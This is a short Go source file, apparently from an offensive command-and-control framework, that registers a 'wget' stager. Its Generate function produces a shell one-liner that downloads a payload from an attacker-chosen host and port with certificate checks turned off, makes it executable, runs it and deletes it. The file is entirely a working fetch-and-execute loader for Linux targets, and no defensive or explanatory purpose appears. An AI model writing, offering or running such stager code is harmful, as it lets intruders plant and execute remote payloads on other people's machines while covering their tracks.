package loader

import "fmt"

type wgetLoader struct{}

func init() { Register(&wgetLoader{}) }

func (w *wgetLoader) Name() string        { return "wget" }
func (w *wgetLoader) Description() string { return "wget HTTPS pull + exec" }
func (w *wgetLoader) RequiresTool() string { return "wget" }

func (w *wgetLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (w *wgetLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`f=$(mktemp);wget --no-check-certificate -qO $f https://%s:%s/p/%s;chmod +x $f;$f;rm -f $f`,
		opts.Host, opts.Port, opts.Token,
	), nil
}
